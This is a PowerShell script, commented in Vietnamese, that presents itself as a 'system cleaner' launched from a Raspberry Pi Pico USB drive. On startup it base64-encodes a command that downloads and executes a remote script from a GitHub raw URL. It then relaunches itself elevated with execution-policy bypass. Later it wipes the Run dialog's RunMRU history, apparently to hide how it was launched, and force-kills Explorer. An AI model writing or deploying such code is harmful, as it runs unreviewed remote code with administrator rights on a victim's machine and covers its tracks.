# --- ĐOẠN XIN QUYỀN ADMIN CHUẨN ENCODED GIỮ NGUYÊN ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $url = 'https://raw.githubusercontent.com/huuthach30032003-code/pico-system-cleaner/refs/heads/main/optimize.ps1'
    $rawCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr '$url' -UseBasicParsing).Content"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
    $encodedCmd = [Convert]::ToBase64String($bytes)
    Start-Process powershell.exe -ArgumentList "-NoP", "-Exec", "Bypass", "-NoExit", "-EncodedCommand", $encodedCmd -Verb RunAs
    exit
}

# 1. Tự động tìm ký tự ổ đĩa của USB Pico (Tìm ổ có tên là CIRCUITPY)
$usbDrive = (Get-Volume | Where-Object {$_.FileSystemLabel -eq "CIRCUITPY"}).DriveLetter
if ($usbDrive) {
    # Mở file HTML có sẵn trong USB bằng trình duyệt
    Start-Process "file:///${usbDrive}:/interface.html"
}

# Đường dẫn file trạng thái trung gian
$logPath = "C:\Windows\Temp\cleaner_status.txt"
"[*] Hệ thống AI đã kích hoạt thành công." | Out-File -FilePath $logPath -Encoding utf8 -Force

function Update-Log {
    param([string]$Text)
    "[$((Get-Date).ToString('HH:mm:ss'))] $Text" | Out-File -FilePath $logPath -Append -Encoding utf8
}

# --- TIẾN HÀNH DỌN DẸP THỰC TẾ ---
Update-Log "Đang quét và dọn dẹp các tập tin tạm thời..."
if (Test-Path "$env:TEMP\*") {
    Get-ChildItem -Path "$env:TEMP\*" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        Update-Log " -> DELETING: $($_.Name)"
        Remove-Item -Path $_.FullName -Force -Recurse -ErrorAction SilentlyContinue
    }
}

Update-Log "Đang làm sạch bộ nhớ Thùng rác..."
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Update-Log "Đang tối ưu cấu hình Registry..."
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "MenuShowDelay" -Value 0

Update-Log "Đang dọn dẹp phân vùng lưu trữ WinSxS..."
dism /online /cleanup-image /startcomponentcleanup /resetbase | Out-Null

# Xóa lịch sử RunMRU và reset Explorer
Update-Log "Đang xóa dấu vết lịch sử hộp thoại Run..."
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -Force -ErrorAction SilentlyContinue

Update-Log "Làm mới hệ thống Windows Explorer..."
Stop-Process -Name explorer -Force

Update-Log "=== QUÁ TRÌNH TỐI ƯU HOÀN TẤT SACH SẼ ==="
[System.Console]::Beep(1000, 100)
[System.Console]::Beep(1500, 300)

Start-Sleep -Seconds 3
Remove-Item $logPath -Force -ErrorAction SilentlyContinue
exit
